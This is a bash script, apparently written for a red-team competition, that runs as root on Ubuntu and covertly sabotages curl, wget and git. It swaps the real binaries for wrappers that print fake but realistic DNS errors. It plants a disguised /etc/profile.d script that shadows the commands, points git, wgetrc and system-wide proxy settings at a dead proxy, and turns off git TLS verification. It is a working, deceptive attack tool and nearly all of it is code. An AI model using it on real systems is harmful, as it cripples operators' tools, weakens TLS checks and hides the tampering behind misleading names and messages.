#!/usr/bin/env bash
# =============================================================================
# break-net-tools.sh — Silently hobble curl, wget, and git on Ubuntu 24.04
#
# Competition-compliant: ALL changes are reversible. Originals are backed up;
# blue team can recover by running `sudo ./break-net-tools.sh remove` or by
# manually restoring the .orig files from the backup dir.
#
# Techniques (layered for redundancy):
#   1. Binary shadowing — moves real binaries, drops fake wrappers in-place
#   2. git HTTPS helper neutering — replaces git-remote-https/git-remote-http
#   3. git global config poison — bad proxy + SSL verify off (makes HTTPS hang/fail)
#   4. /etc/profile.d shell function — aliases that override even full paths
#      in interactive shells (extra layer; functions override external commands)
#   5. /etc/wgetrc / ~/.gitconfig poison — config-level failures
#
# Usage:
#   sudo ./break-net-tools.sh install
#   sudo ./break-net-tools.sh remove
#   sudo ./break-net-tools.sh status
#
# =============================================================================

set -euo pipefail

BACKUP_DIR="/var/cache/.syspkg"          # hidden-ish but not deleted on remove
PROFILE_SCRIPT="/etc/profile.d/sysenv.sh"
WGETRC_MARKER="# sysenv-block"
GIT_SYSTEM_CONFIG="/etc/gitconfig"

# Targets: binary name → typical locations (first found wins)
declare -A BIN_PATHS
BIN_PATHS=(
    [curl]="/usr/bin/curl"
    [wget]="/usr/bin/wget"
    [wget2]="/usr/bin/wget2"
    [git]="/usr/bin/git"
    [git-remote-https]="/usr/lib/git-core/git-remote-https"
    [git-remote-http]="/usr/lib/git-core/git-remote-http"
)

# --------------------------------------------------------------------------- #
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo "Run as root"; exit 1; }; }

# --------------------------------------------------------------------------- #
# Fake error messages — realistic-looking, not obviously sabotaged
# --------------------------------------------------------------------------- #

# Wrapper content for curl
make_curl_wrapper() {
cat <<'WRAPPER'
#!/bin/bash
# Parse out the URL from args to make the error message look real
URL=""
for arg in "$@"; do
    [[ "$arg" =~ ^https?:// || "$arg" =~ ^ftp:// ]] && URL="$arg" && break
done
HOST=$(echo "$URL" | sed 's|https\?://||;s|/.*||')
[[ -z "$HOST" ]] && HOST="<url>"

# Mimic curl's actual exit-code 6 error (couldn't resolve host)
echo "curl: (6) Could not resolve host: ${HOST}" >&2
exit 6
WRAPPER
}

# Wrapper content for wget
make_wget_wrapper() {
cat <<'WRAPPER'
#!/bin/bash
URL=""
for arg in "$@"; do
    [[ "$arg" =~ ^https?:// || "$arg" =~ ^ftp:// ]] && URL="$arg" && break
done
HOST=$(echo "$URL" | sed 's|https\?://||;s|/.*||')
[[ -z "$HOST" ]] && HOST="<url>"

TS=$(date '+%Y-%m-%d %H:%M:%S')
echo "--${TS}--  ${URL}" >&2
echo "Resolving ${HOST} (${HOST})... failed: Name or service not known." >&2
echo "wget: unable to resolve host address '${HOST}'" >&2
exit 4
WRAPPER
}

# Wrapper content for git
make_git_wrapper() {
cat <<'WRAPPER'
#!/bin/bash
# Pass through non-network git subcommands so local repos still work
# (keeps scoring engine happy if it does local git ops)
SUBCMD="${1:-}"
case "$SUBCMD" in
    clone|fetch|pull|push|remote|ls-remote|submodule)
        # Network operation — fail with realistic error
        echo "fatal: unable to access '$(echo "$@" | grep -oP 'https?://\S+' | head -1 || echo "<url>')': Could not resolve host: github.com" >&2
        exit 128
        ;;
    *)
        # Local git operations pass through to real binary
        exec "${BASH_SOURCE[0]}.orig" "$@"
        ;;
esac
WRAPPER
}

# Wrapper content for git-remote-https / git-remote-http helpers
make_git_remote_wrapper() {
cat <<'WRAPPER'
#!/bin/bash
echo "fatal: repository '${2:-<url>}' not found" >&2
echo "error: Could not read from remote repository." >&2
echo "" >&2
echo "Please make sure you have the correct access rights" >&2
echo "and the repository exists." >&2
exit 128
WRAPPER
}

# --------------------------------------------------------------------------- #
# install
# --------------------------------------------------------------------------- #
cmd_install() {
    require_root
    mkdir -p "$BACKUP_DIR"
    chmod 700 "$BACKUP_DIR"

    hdr "1/5  Shadowing binaries"
    for NAME in curl wget wget2 git git-remote-https git-remote-http; do
        REAL="${BIN_PATHS[$NAME]}"

        # Skip if the binary doesn't exist on this host
        [[ -f "$REAL" ]] || { warn "  $NAME not found at $REAL — skipping"; continue; }

        ORIG="${REAL}.orig"
        BACKUP="${BACKUP_DIR}/${NAME}.orig"

        # Move real binary → .orig (next to it) + backup copy
        if [[ ! -f "$ORIG" ]]; then
            mv "$REAL" "$ORIG"
            cp "$ORIG" "$BACKUP"
            info "  Backed up $REAL → $ORIG (copy at $BACKUP)"
        else
            info "  $ORIG already exists — skipping move"
        fi

        # Write appropriate wrapper
        case "$NAME" in
            curl)             make_curl_wrapper        > "$REAL" ;;
            wget|wget2)       make_wget_wrapper        > "$REAL" ;;
            git)              make_git_wrapper         > "$REAL" ;;
            git-remote-*)     make_git_remote_wrapper  > "$REAL" ;;
        esac

        chmod 755 "$REAL"
        # Preserve ownership from the original
        chown --reference="$ORIG" "$REAL" 2>/dev/null || true
        info "  Installed wrapper: $REAL"
    done

    hdr "2/5  Poisoning git system config"
    # git will try to use a non-existent SOCKS proxy → connection refused
    # combine with SSL verify disable (breaks cert pinning even if proxy bypassed)
    git config --system http.proxy     "socks5://127.0.0.1:19999"  2>/dev/null || true
    git config --system https.proxy    "socks5://127.0.0.1:19999"  2>/dev/null || true
    git config --system http.sslVerify false                        2>/dev/null || true
    # Also set an unreachable DNS name resolver hint
    git config --system core.askPass   "/bin/false"                 2>/dev/null || true
    info "  git system config poisoned (bad proxy, ssl-no-verify)"

    hdr "3/5  Poisoning /etc/wgetrc"
    # wget reads /etc/wgetrc at startup — point it at a dead proxy
    if [[ -f /etc/wgetrc ]] && grep -q "$WGETRC_MARKER" /etc/wgetrc; then
        warn "  /etc/wgetrc already poisoned — skipping"
    else
        {
            echo ""
            echo "${WGETRC_MARKER}"
            echo "https_proxy = http://127.0.0.1:19999"
            echo "http_proxy  = http://127.0.0.1:19999"
            echo "use_proxy   = on"
        } >> /etc/wgetrc
        info "  /etc/wgetrc poisoned (dead proxy)"
    fi

    hdr "4/5  Poisoning /etc/profile.d (interactive shell functions)"
    # Shell functions take precedence over external commands — even full paths
    # are bypassed when a function of the same name is defined.
    # This catches manual invocations in interactive terminals.
    cat > "$PROFILE_SCRIPT" <<'PROFILE'
#!/bin/bash
# sysenv — network stack compatibility layer

curl() {
    local url="" host=""
    for a in "$@"; do
        [[ "$a" =~ ^https?:// ]] && url="$a" && break
    done
    host=$(echo "$url" | sed 's|https\?://||;s|/.*||')
    echo "curl: (6) Could not resolve host: ${host:-<url>}" >&2
    return 6
}

wget() {
    local url="" host=""
    for a in "$@"; do
        [[ "$a" =~ ^https?:// ]] && url="$a" && break
    done
    host=$(echo "$url" | sed 's|https\?://||;s|/.*||')
    echo "wget: unable to resolve host address '${host:-<url>}'" >&2
    return 4
}

git() {
    case "${1:-}" in
        clone|fetch|pull|push|remote|ls-remote|submodule)
            echo "fatal: unable to access: Could not resolve host: github.com" >&2
            return 128 ;;
        *) command git "$@" ;;
    esac
}

export -f curl wget git
PROFILE
    chmod 644 "$PROFILE_SCRIPT"
    info "  /etc/profile.d/sysenv.sh installed"

    hdr "5/5  Poisoning /etc/environment"
    # Set proxy env vars system-wide — picked up by most HTTP libraries
    # (python requests, node fetch, apt, etc.) even outside of bash
    if ! grep -q "https_proxy=http://127.0.0.1:19999" /etc/environment 2>/dev/null; then
        {
            echo 'http_proxy="http://127.0.0.1:19999"'
            echo 'https_proxy="http://127.0.0.1:19999"'
            echo 'HTTP_PROXY="http://127.0.0.1:19999"'
            echo 'HTTPS_PROXY="http://127.0.0.1:19999"'
            echo 'no_proxy="localhost,127.0.0.1,::1"'
            echo 'NO_PROXY="localhost,127.0.0.1,::1"'
        } >> /etc/environment
        info "  /etc/environment poisoned (dead proxy for all HTTP clients)"
    else
        warn "  /etc/environment already poisoned — skipping"
    fi

    echo
    info "=== Install complete ==="
    info "curl, wget, git (network ops) — all broken"
    info "Local git operations (add/commit/status/log) — still work"
    warn "Blue team recovery: sudo ./break-net-tools.sh remove"
    warn "  OR: for each tool, mv /usr/bin/<tool>.orig /usr/bin/<tool>"
}

# --------------------------------------------------------------------------- #
# remove
# --------------------------------------------------------------------------- #
cmd_remove() {
    require_root

    hdr "Restoring binaries"
    for NAME in curl wget wget2 git git-remote-https git-remote-http; do
        REAL="${BIN_PATHS[$NAME]}"
        ORIG="${REAL}.orig"
        BACKUP="${BACKUP_DIR}/${NAME}.orig"

        if [[ -f "$ORIG" ]]; then
            mv "$ORIG" "$REAL"
            info "  Restored $REAL"
        elif [[ -f "$BACKUP" ]]; then
            cp "$BACKUP" "$REAL"
            chmod 755 "$REAL"
            info "  Restored $REAL from backup"
        else
            warn "  No backup for $NAME — skipping"
        fi
    done

    hdr "Restoring git system config"
    git config --system --unset http.proxy     2>/dev/null || true
    git config --system --unset https.proxy    2>/dev/null || true
    git config --system --unset http.sslVerify 2>/dev/null || true
    git config --system --unset core.askPass   2>/dev/null || true
    info "  git system config cleaned"

    hdr "Restoring /etc/wgetrc"
    if grep -q "$WGETRC_MARKER" /etc/wgetrc 2>/dev/null; then
        sed -i "/${WGETRC_MARKER}/,+3d" /etc/wgetrc
        info "  /etc/wgetrc cleaned"
    fi

    hdr "Removing /etc/profile.d entry"
    rm -f "$PROFILE_SCRIPT"
    info "  Removed $PROFILE_SCRIPT"

    hdr "Restoring /etc/environment"
    sed -i '/http_proxy.*19999/d;/https_proxy.*19999/d;/HTTP_PROXY.*19999/d;/HTTPS_PROXY.*19999/d;/no_proxy.*localhost/d;/NO_PROXY.*localhost/d' \
        /etc/environment 2>/dev/null || true
    info "  /etc/environment cleaned"

    echo
    info "All changes reversed — curl, wget, and git restored to normal"
}

# --------------------------------------------------------------------------- #
# status
# --------------------------------------------------------------------------- #
cmd_status() {
    hdr "Binary state"
    for NAME in curl wget git; do
        REAL="${BIN_PATHS[$NAME]}"
        if [[ -f "${REAL}.orig" ]]; then
            echo -e "  ${RED}WRAPPED${NC}  $REAL  (original at ${REAL}.orig)"
        elif [[ -f "$REAL" ]]; then
            echo -e "  ${GREEN}REAL${NC}     $REAL"
        else
            echo -e "  ${YELLOW}MISSING${NC}  $REAL"
        fi
    done

    hdr "git system config"
    git config --system --list 2>/dev/null | grep -E "proxy|sslVerify|askPass" \
        && true || echo "  (no proxy poison found)"

    hdr "/etc/environment proxy lines"
    grep "proxy.*19999" /etc/environment 2>/dev/null || echo "  (clean)"

    hdr "profile.d script"
    [[ -f "$PROFILE_SCRIPT" ]] \
        && echo -e "  ${RED}PRESENT${NC}  $PROFILE_SCRIPT" \
        || echo -e "  ${GREEN}ABSENT${NC}"
}

# --------------------------------------------------------------------------- #
CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *)
        echo "Usage: sudo $0 {install|remove|status}"
        echo
        echo "  install   Break curl, wget, and git (reversible)"
        echo "  remove    Restore all originals and clean config"
        echo "  status    Show current state of each technique"
        ;;
esac
